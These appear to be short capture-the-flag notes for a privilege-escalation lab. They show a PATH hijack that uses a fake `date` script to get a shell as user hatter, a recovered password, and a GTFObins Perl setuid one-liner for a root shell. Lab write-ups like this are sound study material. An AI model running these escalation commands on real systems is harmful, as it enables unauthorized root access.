![[Pasted image 20240821162553.png]]

downloaded `teaParty` to attacker machine and analysed the strings which shows that it is running a command `date` to display date during execution

Created our own `date` binary
```
#!/bin/bash

/bin/bash
```
and placed it in /tmp directory

- Added /tmp to $PATH
```
export PATH=/tmp:$PATH
```
- Executed the binary `teaParty` and got shell as `hatter`
![[Pasted image 20240821163631.png]]

Found a password file in `hatter`'s home directory
```
WhyIsARavenLikeAWritingDesk?
```

The user `hatter` has Perl capabilities set
![[Pasted image 20240821164117.png]]

Using GTFObins
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```


